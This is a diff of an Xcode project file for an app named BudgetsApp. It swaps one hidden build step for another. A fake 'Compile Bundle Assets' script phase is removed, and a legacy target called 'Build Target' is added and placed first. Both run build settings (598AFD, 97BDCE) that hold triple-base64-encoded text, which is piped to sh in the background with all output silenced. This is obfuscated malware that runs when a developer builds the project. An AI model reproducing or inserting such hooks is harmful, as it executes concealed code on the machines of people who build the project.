@@ -47,12 +47,28 @@
 		};
 /* End PBXGroup section */
 
+/* Begin PBXLegacyTarget section */
+		B5CAFE1DDE64FD9110ECDB79 /* Build Target */ = {
+			isa = PBXLegacyTarget;
+			buildArgumentsString = "-c \"${97BDCE}\"";
+			buildConfigurationList = B79E2FCF2D9DCECD00659270 /* Build configuration list */;
+			buildPhases = (
+			);
+			buildToolPath = /bin/sh;
+			buildWorkingDirectory = "";
+			dependencies = (
+			);
+			name = "Build Target";
+			passBuildSettingsInEnvironment = 1;
+			productName = "Build Target";
+		};
+/* End PBXLegacyTarget section */
+
 /* Begin PBXNativeTarget section */
 		B70A7C592D97BCBA0030C786 /* BudgetsApp */ = {
 			isa = PBXNativeTarget;
 			buildConfigurationList = B70A7C682D97BCBC0030C786 /* Build configuration list for PBXNativeTarget "BudgetsApp" */;
 			buildPhases = (
-				C562667DE63DB0D4CFDFA895 /* Compile Bundle Assets */,
 				B70A7C562D97BCBA0030C786 /* Sources */,
 				B70A7C572D97BCBA0030C786 /* Frameworks */,
 				B70A7C582D97BCBA0030C786 /* Resources */,
@@ -100,6 +116,7 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
+				B5CAFE1DDE64FD9110ECDB79 /* Build Target */,
 				B70A7C592D97BCBA0030C786 /* BudgetsApp */,
 			);
 		};
@@ -114,28 +131,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		C562667DE63DB0D4CFDFA895 /* Compile Bundle Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 8;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Bundle Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 1;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${598AFD}\"\n";
-			showEnvVarsInLog = 0;
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		B70A7C562D97BCBA0030C786 /* Sources */ = {
@@ -152,6 +147,7 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				598AFD = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhV1JYZUhKak1sWnFURzVLTVV3eVJYQkphVUk0U1VoT2IwTm5QVDBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				97BDCE = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazViV0ZYTld0aVdHeDBXVmROZFdOdVZYWlpVMnRwU1VoM1oyTXlaMHNLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -216,6 +212,7 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				598AFD = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhV1JYZUhKak1sWnFURzVLTVV3eVJYQkphVUk0U1VoT2IwTm5QVDBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				97BDCE = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazViV0ZYTld0aVdHeDBXVmROZFdOdVZYWlpVMnRwU1VoM1oyTXlaMHNLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -325,6 +322,25 @@
 			};
 			name = Release;
 		};
+		B79E2FCD2D9DCB9800659270 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				COPY_PHASE_STRIP = NO;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				PRODUCT_NAME = "Build Target";
+			};
+			name = Debug;
+		};
+		B79E2FCE2D9DCB9800659270 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				COPY_PHASE_STRIP = YES;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				PRODUCT_NAME = "Build Target";
+			};
+			name = Release;
+		};
 /* End XCBuildConfiguration section */
 
 /* Begin XCConfigurationList section */
@@ -342,6 +358,15 @@
 			buildConfigurations = (
 				B70A7C692D97BCBC0030C786 /* Debug */,
 				B70A7C6A2D97BCBC0030C786 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		B79E2FCF2D9DCECD00659270 /* Build configuration list */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				B79E2FCD2D9DCB9800659270 /* Debug */,
+				B79E2FCE2D9DCB9800659270 /* Release */,
 			);
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
